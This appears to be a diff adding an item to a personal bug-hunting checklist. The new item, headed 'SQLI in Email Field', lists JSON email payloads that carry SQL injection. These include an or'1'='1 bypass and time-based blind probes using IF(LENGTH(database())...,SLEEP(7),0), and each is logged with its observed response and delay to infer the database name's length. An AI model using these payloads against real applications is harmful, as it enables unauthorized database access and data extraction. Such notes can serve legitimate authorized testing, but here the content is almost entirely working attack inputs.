@@ -35,7 +35,20 @@
     	- Then create acount2 wiht the same email but different method like google login
      	-  See if can access any data
     -------------------------------------------------------------
-    7-  
+    7- SQLI in Email Field
+
+	{"email":"asd'a@a.com"} --> Not Valid
+	{"email":"asd'or'1'='1@a.com" }  --> valid
+	{"email":"a'-IF(LENGTH(database())>9,SLEE P(7),0)or'1'='1@a.com"} --> Not Valid
+	{"email":"a'-IF(LENGTH(database())>9,SLEE P(7),0)or'1'='1@a.com"}  -> Valid -->  Delay: 7,854 milis
+	{"email":"\\"a'-IF(LENGTH(database())=10,SLEEP(7),0)or'1'='1\\"@a.com"} --> {"code":0,"status":200,"mes sage":"Berhasil"} --> Valid --> Delay 8,696 milis
+	{"email":"\\"a"-IF(LENGTH(database())=11,SLEEP(7),0)or'1'='1\\"@a.com"} ---> {"code":0,"status":200,"mes sage":"Berhasil"} ---> Valid --> No delay
+	-------------------------------------------------------------
+
+	- 
+
+
+ 
       
 </details>
 
